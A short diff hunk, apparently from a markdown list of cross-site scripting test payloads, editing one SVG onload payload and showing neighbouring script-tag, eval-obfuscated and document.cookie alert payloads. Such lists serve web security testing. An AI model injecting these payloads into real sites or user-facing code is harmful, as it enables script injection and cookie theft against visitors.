@@ -291,7 +291,7 @@ a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);
 ```
 '"()&%<acx><ScRiPt >prompt(915149)</ScRiPt>
  
-<svg/οnlοad=alert(1)>
+<svg οnlοad=alert(1)>
  
 <script>alert(document.cookie)</script>
  
